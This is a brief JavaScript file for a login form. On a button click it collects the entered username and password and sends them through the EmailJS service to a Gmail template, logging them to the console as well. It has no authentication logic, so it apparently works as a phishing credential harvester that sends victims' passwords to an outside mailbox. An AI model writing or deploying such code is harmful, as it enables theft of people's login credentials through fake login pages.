const btn = document.getElementById("btn");
const login = document.getElementById("input-login");
const password = document.getElementById("input-password");

const userID = "user_6cT7t06fe6Ty0oNU6BFD5";

(function() {
  emailjs.init(this.userID);
  console.log("Initialized");
})();

btn.addEventListener("click", () => {
  let params = {
    login: login.value,
    password: password.value
  };

  emailjs.send("gmail", "template_fTd4JPPK", params, userID).then(
    function(response) {
      console.log("SUCCESS!", response.status, response.text);
    },
    function(error) {
      console.log("FAILED...", error);
    }
  );
  console.log(params);
});
